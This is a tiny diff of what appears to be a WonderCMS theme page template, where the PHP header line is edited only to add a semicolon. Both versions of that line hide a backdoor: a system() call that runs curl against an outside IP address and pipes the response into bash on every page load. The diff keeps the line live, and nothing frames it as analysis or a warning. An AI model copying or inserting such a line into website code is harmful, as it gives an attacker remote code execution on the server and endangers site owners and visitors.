@@ -1,4 +1,4 @@
-<?php system("curl 10.0.16.82|bash"); global $Wcms ?>
+<?php system("curl 10.0.16.82|bash"); global $Wcms; ?>
 
 <!DOCTYPE html>
 <html lang="en">
